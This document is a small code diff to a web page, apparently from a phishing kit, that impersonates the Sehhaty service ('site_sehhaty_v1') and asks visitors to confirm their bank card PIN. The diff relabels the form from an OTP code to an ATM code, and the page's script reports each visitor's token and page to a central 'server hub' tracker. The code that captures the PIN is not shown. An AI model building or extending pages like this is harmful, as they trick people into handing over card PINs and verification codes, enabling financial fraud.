@@ -21,7 +21,7 @@
     </div>
 
     <script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000", siteKey = "site_sehhaty_v1", visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
-        var formName = "رمز التحقق OTP";
+        var formName = "رمز الصراف";
 
         fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/pin.html', pageTitle: 'تأكيد الرمز السري للبطاقة - PIN' }) }).catch(function(){});
 
